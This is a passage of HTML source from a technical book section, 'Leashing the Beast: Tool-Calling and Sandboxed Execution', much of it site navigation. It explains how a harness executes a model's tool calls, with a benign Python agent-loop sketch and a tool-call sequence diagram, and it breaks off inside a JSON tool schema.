+    <nav class="md-nav" aria-label="Concept loop 4: The harness pattern — assembling the full loop">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#concept_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Concept
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#worked-example_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Worked example
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-5-4-complete-harnessed-agent-loop-with-tool-calling-and-sandbox" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example 5-4. Complete harnessed agent loop with tool-calling and sandbox
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#check-yourself_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Check yourself
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#concept-loop-5-production-hardening" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Concept loop 5: Production hardening
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Concept loop 5: Production hardening">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#concept_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Concept
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#worked-example_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Worked example
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-5-5-production-policy-layer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example 5-5. Production policy layer
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#check-yourself_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Check yourself
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-we-built" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What we built
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#verification-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Verification checklist
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#wrapping-up" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Wrapping up
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#retrieval-practice" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Retrieval practice
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Retrieval practice">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exercise-1-trace-the-protocol" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exercise 1 — Trace the protocol
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exercise-2-sandbox-escape-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exercise 2 — Sandbox escape analysis
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exercise-3-cost-cap-calculation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exercise 3 — Cost cap calculation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exercise-4-design-a-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exercise 4 — Design a policy
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5.2%20OpenRouter%20The%20Switzerland%20of%20the%20Model%20Wars/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5.2 OpenRouter: The Switzerland of the Model Wars
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5.3%20OpenCode%20and%20the%20Democratization%20of%20Agentic%20Access/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5.3 OpenCode and the Democratization of Agentic Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 6: The Containment Fields
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Chapter 6: The Containment Fields
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6.1%20AWS%20Bedrock%20and%20Azure%20AI%20Foundry%20The%20Enterprise%20Response/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6.1 AWS Bedrock and Azure AI Foundry: The Enterprise Response
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6.2%20The%20Copilot%20Workspace%20Agentifying%20the%20Pull%20Request/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6.2 The Copilot Workspace: Agentifying the Pull Request
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6.3%20Security%20and%20Governance%20in%20the%20Age%20of%20Shadow%20Agents/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6.3 Security and Governance in the Age of Shadow Agents
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Part IV: Global Shifting and Open Frontiers
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Part IV: Global Shifting and Open Frontiers
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_1" id="__nav_6_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 7: The Dragon in the Machine
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Chapter 7: The Dragon in the Machine
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part4/7.1%20DeepSeek%20and%20Qwen%20Shattering%20the%20Western%20Moat/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.1 DeepSeek and Qwen: Shattering the Western Moat
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part4/7.2%20The%20Efficiency%20Gap%20High-Performance%20Coding%20on%20a%20Budget/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.2 The Efficiency Gap: High-Performance Coding on a Budget
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part4/7.3%20The%20Geopolitics%20of%20Code%20Generation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.3 The Geopolitics of Code Generation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2" id="__nav_6_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 8: The Open Source Insurgency
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Chapter 8: The Open Source Insurgency
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part4/8.1%20Aider%20OpenDevin%20and%20the%20Bazaar%20of%20Agents/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8.1 Aider, OpenDevin, and the Bazaar of Agents
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part4/8.2%20Local-First%20Running%20Boris%20on%20a%20Mac%20Studio/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8.2 Local-First: Running Boris on a Mac Studio
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part4/8.3%20The%20Rise%20of%20the%20Personal%20Agent%20Stack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8.3 The Rise of the Personal Agent Stack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Part V: The Acceleralpho Horizon
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Part V: The Acceleralpho Horizon
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_1" id="__nav_7_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 9: The End of the Human in the Loop
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Chapter 9: The End of the Human in the Loop
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part5/9.1%20Self-Healing%20Codebases%20and%20Autonomous%20Bug-Hunting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9.1 Self-Healing Codebases and Autonomous Bug-Hunting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part5/9.2%20The%20Synthetic%20Senior%20Managing%20Intent%20vs%20Managing%20Code/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9.2 The Synthetic Senior: Managing Intent vs. Managing Code
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part5/9.3%20The%20Psychopathology%20of%20AI-Driven%20Technical%20Debt/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9.3 The Psychopathology of AI-Driven Technical Debt
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter 10: The Strossian Singularity
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Chapter 10: The Strossian Singularity
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part5/10.1%20Vile%20Offspring%20Agents%20Writing%20Agents/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10.1 Vile Offspring: Agents Writing Agents
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part5/10.2%20From%20Programmer%20to%20Agent%20Wrangler%20The%20New%20Career%20Path/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10.2 From Programmer to Agent Wrangler
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part5/10.3%20Post-Code%20When%20Software%20is%20Grown%20Not%20Written/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10.3 Post-Code: When Software is Grown, Not Written
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../references/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    References
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="51-leashing-the-beast-tool-calling-and-sandboxed-execution">5.1 Leashing the Beast: Tool-Calling and Sandboxed Execution<a class="headerlink" href="#51-leashing-the-beast-tool-calling-and-sandboxed-execution" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p><strong>How to read this section:</strong> This is the opening of Part III. Parts I and II built the vocabulary — agent loops, failure modes, reliability harnesses, context engines, and the Loom threading model. This section adds the two missing capabilities that turn a text generator into a <em>working</em> agent: tool-calling (structured interaction with the outside world) and sandboxed execution (safe code running). Read the five concept loops in order. By loop 3 you will have a running sandbox; by loop 5 you will have a production-hardened harness. If you already use function-calling APIs, skim loop 2 and start at loop 3.</p>
+</blockquote>
+<h2 id="why-this-section-matters">Why this section matters<a class="headerlink" href="#why-this-section-matters" title="Permanent link">&para;</a></h2>
+<p>A language model that cannot <em>do</em> anything is a very expensive autocomplete. It can draft code, but it cannot run that code, read the file it just broke, or verify its fix compiles. The gap between generation and execution is the central bottleneck in agentic systems.</p>
+<p>Section 2.3 built the reliability harness — budget gates, circuit breakers, checkpoints. Section 4.2 separated orchestration from execution inside the Loom framework. But both assumed something we never made explicit: <strong>the model can call tools.</strong> That assumption is the load-bearing wall. Remove it and the harness has nothing to execute, the orchestrator has nothing to delegate to, and the agent is a chatbot.</p>
+<p>This section builds the wall. Tool-calling gives the model structured access to the outside world. Sandboxed execution ensures that access cannot destroy the host. Together they complete the harness pattern from Section 2.3 and provide the execution substrate that Section 4.2's orchestrator depends on.</p>
+<h2 id="deliverable">Deliverable<a class="headerlink" href="#deliverable" title="Permanent link">&para;</a></h2>
+<p>By the end of this section, the reader can:</p>
+<ul>
+<li>explain why raw model output is inert without a tool-calling protocol,</li>
+<li>define a tool schema in JSON Schema and wire it into a model→harness→tool loop,</li>
+<li>run untrusted LLM-generated code inside a sandboxed container with resource limits,</li>
+<li>assemble the full harness pattern (tool-calling + sandbox + verification), and</li>
+<li>apply production hardening controls: rate limits, cost caps, timeouts, and capability-based permissions.</li>
+</ul>
+<hr />
+<h2 id="concept-loop-1-why-raw-models-are-useless-without-leashes">Concept loop 1: Why raw models are useless without leashes<a class="headerlink" href="#concept-loop-1-why-raw-models-are-useless-without-leashes" title="Permanent link">&para;</a></h2>
+<h3 id="concept">Concept<a class="headerlink" href="#concept" title="Permanent link">&para;</a></h3>
+<p>A foundation model accepts text and returns text. That is the entire contract. It cannot open a file. It cannot run a test. It cannot hit an API. Every "action" you have seen a coding agent perform — editing code, executing shell commands, searching a codebase — happened because <em>harness code outside the model</em> intercepted a structured request, executed it, and fed the result back.</p>
+<p>The model's job is to <em>decide</em> what to do. The harness's job is to <em>do</em> it. Without the harness, the model is a brain in a jar.</p>
+<pre class="mermaid"><code>flowchart LR
+    User([User prompt]) --&gt; Model[LLM]
+    Model --&gt; Text["Raw text output&lt;br/&gt;(inert — nothing happens)"]
+    style Text fill:#f66,color:#fff</code></pre>
+<p>Three consequences follow:</p>
+<ol>
+<li><strong>No grounding.</strong> The model cannot verify its own output. It generates a function but cannot check if it parses, passes tests, or even runs.</li>
+<li><strong>No state mutation.</strong> The model cannot write to disk, call an API, or change the world. Every "write file" is a suggestion until the harness acts.</li>
+<li><strong>No feedback.</strong> Without execution results, the model cannot self-correct. It hallucinates confidently because nothing pushes back.</li>
+</ol>
+<blockquote>
+<p><strong>Key idea:</strong> The model is a policy function: given state, it proposes an action. The harness is the environment: it executes the action and returns the next state. This is the agent loop — and it is impossible without tool-calling.</p>
+</blockquote>
+<h3 id="worked-example">Worked example<a class="headerlink" href="#worked-example" title="Permanent link">&para;</a></h3>
+<p>Imagine asking a raw model to fix a broken import in <code>app.py</code>. Without tools, the conversation looks like this:</p>
+<table>
+<thead>
+<tr>
+<th>Turn</th>
+<th>Role</th>
+<th>Content</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>User</td>
+<td>"Fix the broken import in app.py"</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Model</td>
+<td>"Change line 3 from <code>import flas</code> to <code>import flask</code>"</td>
+</tr>
+<tr>
+<td>3</td>
+<td>User</td>
+<td>(must manually apply the edit, run the app, and paste results back)</td>
+</tr>
+</tbody>
+</table>
+<p>The model <em>suggested</em> a fix but could not apply it, test it, or confirm it worked. Every round trip requires a human in the loop. This is the pre-tool-calling world — and it is why early Copilot completions felt like autocomplete, not agency.</p>
+<h3 id="example-5-1-the-inert-model-vs-the-tool-equipped-agent">Example 5-1. The inert model vs. the tool-equipped agent<a class="headerlink" href="#example-5-1-the-inert-model-vs-the-tool-equipped-agent" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Without tools: the model can only suggest</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="k">def</span> <span class="nf">inert_agent</span><span class="p">(</span><span class="n">prompt</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">model_fn</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Returns text. Cannot act on the world.&quot;&quot;&quot;</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>    <span class="k">return</span> <span class="n">model_fn</span><span class="p">(</span><span class="n">prompt</span><span class="p">)</span>  <span class="c1"># &quot;Change line 3 to ...&quot;</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="c1"># With tools: the harness executes the model&#39;s decisions</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="k">def</span> <span class="nf">tool_agent</span><span class="p">(</span><span class="n">prompt</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">model_fn</span><span class="p">,</span> <span class="n">tools</span><span class="p">:</span> <span class="nb">dict</span><span class="p">):</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Model proposes actions; harness executes them.&quot;&quot;&quot;</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>    <span class="n">response</span> <span class="o">=</span> <span class="n">model_fn</span><span class="p">(</span><span class="n">prompt</span><span class="p">,</span> <span class="n">tools</span><span class="o">=</span><span class="nb">list</span><span class="p">(</span><span class="n">tools</span><span class="o">.</span><span class="n">keys</span><span class="p">()))</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">tool_call</span><span class="p">:</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>        <span class="n">name</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">tool_call</span><span class="o">.</span><span class="n">name</span>        <span class="c1"># &quot;file_write&quot;</span>
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>        <span class="n">args</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">tool_call</span><span class="o">.</span><span class="n">arguments</span>    <span class="c1"># {&quot;path&quot;: &quot;app.py&quot;, &quot;content&quot;: &quot;...&quot;}</span>
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>        <span class="n">result</span> <span class="o">=</span> <span class="n">tools</span><span class="p">[</span><span class="n">name</span><span class="p">](</span><span class="o">**</span><span class="n">args</span><span class="p">)</span>           <span class="c1"># harness executes</span>
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>        <span class="c1"># Feed result back for next iteration</span>
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>        <span class="k">return</span> <span class="n">model_fn</span><span class="p">(</span><span class="n">prompt</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">),</span> <span class="n">tools</span><span class="o">=</span><span class="nb">list</span><span class="p">(</span><span class="n">tools</span><span class="o">.</span><span class="n">keys</span><span class="p">()))</span>
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>    <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
+</code></pre></div>
+<p>The difference is three lines of code — and the entire gap between a chatbot and an agent.</p>
+<h3 id="check-yourself">Check yourself<a class="headerlink" href="#check-yourself" title="Permanent link">&para;</a></h3>
+<ol>
+<li>What are the three capabilities a raw model lacks that tool-calling provides?</li>
+<li>Why can't the model self-correct without execution feedback?</li>
+<li>In the code above, what happens if <code>tools[name]</code> raises an exception?</li>
+</ol>
+<hr />
+<h2 id="concept-loop-2-tool-calling-fundamentals">Concept loop 2: Tool-calling fundamentals<a class="headerlink" href="#concept-loop-2-tool-calling-fundamentals" title="Permanent link">&para;</a></h2>
+<h3 id="concept_1">Concept<a class="headerlink" href="#concept_1" title="Permanent link">&para;</a></h3>
+<p>Tool-calling (also called function-calling) is a protocol. The model does not literally call a function — it emits a structured JSON object that <em>names</em> a function and provides <em>arguments</em>. The harness deserializes that object, calls the real function, and returns the result as the next message.</p>
+<p>The protocol has three parts:</p>
+<ol>
+<li><strong>Tool definitions</strong> — JSON Schema objects describing available tools (name, description, parameter types).</li>
+<li><strong>Tool-call response</strong> — the model's output when it decides to use a tool instead of generating text.</li>
+<li><strong>Tool result message</strong> — the harness's response, fed back into the conversation.</li>
+</ol>
+<pre class="mermaid"><code>sequenceDiagram
+    participant U as User/Harness
+    participant M as Model
+    participant T as Tool Runtime
+
+    U-&gt;&gt;M: Prompt + tool definitions
+    M-&gt;&gt;U: tool_call: {name: "file_read", args: {path: "app.py"}}
+    U-&gt;&gt;T: Execute file_read("app.py")
+    T-&gt;&gt;U: "import flas\nfrom flask import ..."
+    U-&gt;&gt;M: tool_result: "import flas\n..."
+    M-&gt;&gt;U: tool_call: {name: "file_write", args: {path: "app.py", content: "import flask\n..."}}
+    U-&gt;&gt;T: Execute file_write(...)
+    T-&gt;&gt;U: "OK: wrote 42 bytes"
+    U-&gt;&gt;M: tool_result: "OK: wrote 42 bytes"
+    M-&gt;&gt;U: "Fixed the import on line 1."</code></pre>
+<blockquote>
+<p><strong>Tip:</strong> Tool definitions are the agent's API contract. Vague descriptions produce vague tool calls. Write descriptions as if a junior engineer will read them to decide which tool to use — because that is exactly what the model does.</p>
+</blockquote>
+<h3 id="worked-example_1">Worked example<a class="headerlink" href="#worked-example_1" title="Permanent link">&para;</a></h3>
+<p>A minimal tool set for a coding agent needs three tools: read a file, write a file, run a shell command. Here are their schemas.</p>
+<h3 id="example-5-2-tool-schemas-for-a-minimal-coding-agent">Example 5-2. Tool schemas for a minimal coding agent<a class="headerlink" href="#example-5-2-tool-schemas-for-a-minimal-coding-agent" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">TOOL_SCHEMAS</span> <span class="o">=</span> <span class="p">[</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>    <span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;function&quot;</span><span class="p">,</span> <span class="s2">&quot;function&quot;</span><span class="p">:</span> <span class="p">{</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>        <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;file_read&quot;</span><span class="p">,</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>        <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="s2">&quot;Read file contents at the given path.&quot;</span><span class="p">,</span>
